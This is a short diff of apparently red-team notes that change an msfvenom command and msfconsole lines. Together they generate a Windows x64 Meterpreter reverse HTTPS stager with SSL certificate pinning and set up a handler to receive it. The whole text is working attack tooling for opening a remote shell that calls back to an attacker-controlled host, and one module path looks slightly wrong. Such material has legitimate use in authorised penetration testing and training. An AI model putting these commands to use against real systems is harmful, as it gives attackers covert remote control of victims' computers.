@@ -7,8 +7,9 @@ rm -f www.example.com.key  www.example.com.crt
 
 ------------------------------------------------------------------------------------
 
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= HandlerSSLCert=/../../www.example.com.pem StagerVerifySSLCert=true -f raw -o code.bin
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= HandlerSSLCert=/../../../www.example.com.pem StagerVerifySSLCert=true -f raw -o code.bin
 
-msf > set HandlerSSLCert www.example.com.pem
+msf > use auxiliary/multi/handler
+msf > use payload/windows/x64/meterpreter/reverse_https
+msf > set HandlerSSLCert /../../../www.example.com.pem
 msf > set StagerVerifySSLCert true
-msf > use exploit windows/x64/meterpreter/reverse_https
